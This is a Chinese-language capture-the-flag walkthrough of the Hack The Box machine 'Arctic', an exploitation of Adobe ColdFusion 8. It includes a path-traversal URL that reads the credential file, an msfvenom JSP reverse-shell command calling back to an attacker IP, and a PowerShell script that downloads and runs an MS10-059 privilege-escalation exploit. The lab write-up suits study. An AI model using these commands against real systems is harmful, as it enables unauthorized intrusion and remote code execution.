# Arctic\_11

![image-20200919214733180](assets/Arctic_11.assets/image-20200919214733180.png)

这个在oscp时曾经做过一样的，非常简单

扫目录得到

```bash
http://10.10.10.11:8500/CFIDE/administrator/
```

![image-20200919214935876](assets/Arctic_11.assets/image-20200919214935876.png)

ADOBE COLDFUSION 8

[https://www.exploit-db.com/exploits/14641](https://www.exploit-db.com/exploits/14641)

根据漏洞介绍使用以下payload可以直接读取到凭证

```bash
http://10.10.10.11/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
```

浏览器直接浏览得到md5加密的密码

![image-20200919215407773](assets/Arctic_11.assets/image-20200919215407773.png)

```bash
2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
```

![image-20200919215526979](assets/Arctic_11.assets/image-20200919215526979.png)

```bash
happyday
```

使用用户名`admin`密码`happyday`登陆进ADOBE的后台

此后台可以在`DEBUGGING & LOGGING`下的`Schedule Tasks`中可以通过增加新任务的方式添加文件进服务器。

首先本地生成一个payoad

```bash
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.7 LPORT=4444 -f raw > rshell.jsp
```

同时在本地当前工作目录建立简单的php http服务

```bash
$ php -S localhost:80
PHP 7.2.9-1 Development Server started at Sun Feb  2 14:25:56 2020
Listening on http://localhost:80
Document root is /root/HackTheBox/Arctic_10.10.10.11
Press Ctrl-C to quit.
```

![image-20200919215842171](assets/Arctic_11.assets/image-20200919215842171.png)

在url这里将kali php http 服务下的制作好的rshell文件的url填入

![image-20200919220146247](assets/Arctic_11.assets/image-20200919220146247.png)

文件的真实路径可以通过查看`SERVER SETTINGS`下的`Settings Summary`中查看

![image-20200919220329123](assets/Arctic_11.assets/image-20200919220329123.png)

![image-20200919220446937](assets/Arctic_11.assets/image-20200919220446937.png)

增加任务后点击提交按钮即可浏览`http://10.10.10.11:8500/CFIDE/rshell.jsp`以激活shell

在kali 监听端口可获得shell

![image-20200919221407108](assets/Arctic_11.assets/image-20200919221407108.png)

在用户桌面文件夹可获得user

![image-20200919221539531](assets/Arctic_11.assets/image-20200919221539531.png)

基础枚举后发现win版本适合使用ms10-059

[https://www.exploit-db.com/exploits/14610/](https://www.exploit-db.com/exploits/14610/)

下载好exploit后，在靶机上通过echo生成下载用的powershell脚本

```text
C:\ColdFusion8>echo $webclient = New-Object System.Net.WebClient >>wg.ps1  
echo $webclient = New-Object System.Net.WebClient >>wg.ps1

C:\ColdFusion8>echo $url = "http://10.10.14.7/MS10-059.exe" >>wg.ps1
echo $url = "http://10.10.14.7/MS10-059.exe" >>wg.ps1

C:\ColdFusion8>echo $file = "exploit.exe" >>wg.ps1
echo $file = "exploit.exe" >>wg.ps1

C:\ColdFusion8>echo $webclient.DownloadFile($url,$file) >>wg.ps1
echo $webclient.DownloadFile($url,$file) >>wg.ps1

C:\ColdFusion8>powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wg.ps1
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wg.ps1
```

![image-20200919222534790](assets/Arctic_11.assets/image-20200919222534790.png)

本地未占用的端口设立监听，执行exploit，在监听端口获得新的shell

![image-20200919223157866](assets/Arctic_11.assets/image-20200919223157866.png)

![image-20200919223252336](assets/Arctic_11.assets/image-20200919223252336.png)

root

![image-20200919223412948](assets/Arctic_11.assets/image-20200919223412948.png)

